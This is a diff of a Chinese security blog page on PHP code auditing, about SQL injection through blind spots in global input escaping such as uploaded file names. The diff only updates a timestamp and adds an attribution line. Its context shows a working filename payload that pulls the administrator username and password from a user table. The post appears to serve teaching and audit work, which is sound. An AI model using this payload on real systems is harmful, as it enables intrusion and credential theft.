@@ -90,7 +90,7 @@
 <meta property="og:site_name" content="Braid's Blog">
 <meta property="og:description" content="0x01 背景现在的WEB应用对SQL注入的防护基本都是判断GPC是否开启，然后使用addlashes函数对单引号等特殊字符进行转义。但仅仅使用这样的防护是存在很多盲点的，接上篇http://www.cnbraid.com/2016/04/29/sql5/，这里介绍另外两种情况。盲点如下：①FILES注入，全局只转义掉GET、POST等传来的参数，遗漏了FILES；②变量覆盖，危险函数：extra">
 <meta property="og:image" content="http://7xk8bu.com1.z0.glb.clouddn.com/sql6_01.jpg">
-<meta property="og:updated_time" content="2016-05-10T05:36:13.668Z">
+<meta property="og:updated_time" content="2016-05-11T03:19:28.905Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="【PHP代码审计】 那些年我们一起挖掘SQL注入 - 7.全局防护盲点的总结下篇">
 <meta name="twitter:description" content="0x01 背景现在的WEB应用对SQL注入的防护基本都是判断GPC是否开启，然后使用addlashes函数对单引号等特殊字符进行转义。但仅仅使用这样的防护是存在很多盲点的，接上篇http://www.cnbraid.com/2016/04/29/sql5/，这里介绍另外两种情况。盲点如下：①FILES注入，全局只转义掉GET、POST等传来的参数，遗漏了FILES；②变量覆盖，危险函数：extra">
@@ -332,6 +332,7 @@
 <p>上传一个文件，然后修改文件名称为以下代码即可获取管理员账户密码：</p>
 <pre><code>filename="1','.php',1,(<span class="operator">select <span class="keyword">concat</span>(username,<span class="number">0x23</span>,<span class="keyword">password</span>) <span class="keyword">from</span> ask_user <span class="keyword">limit</span> <span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>)#.jpg<span class="string">"</span></span>
 </code></pre><p>数据库里成功将管理员账户密码插入到attach表中：<br><img src="http://7xk8bu.com1.z0.glb.clouddn.com/sql6_01.jpg" alt=""></p>
+<p>本文由HackBraid整理总结，原文链接：<a href="http://www.cnbraid.com/2016/05/10/sql6/">http://www.cnbraid.com/2016/05/10/sql6/</a>，如需转载请联系作者。</p>
 
       
     </div>
